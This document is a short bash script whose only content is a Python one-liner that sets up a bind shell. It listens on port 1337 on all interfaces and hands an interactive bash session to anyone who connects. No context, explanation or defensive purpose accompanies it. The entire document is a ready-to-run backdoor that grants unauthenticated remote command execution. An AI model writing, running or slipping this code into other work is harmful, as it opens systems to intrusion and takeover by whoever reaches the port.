#!/bin/bash
python3 -c 'import socket,os,pty; s=socket.socket(); s.bind(("0.0.0.0",1337)); s.listen(1); c,a=s.accept(); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); pty.spawn("/bin/bash")'
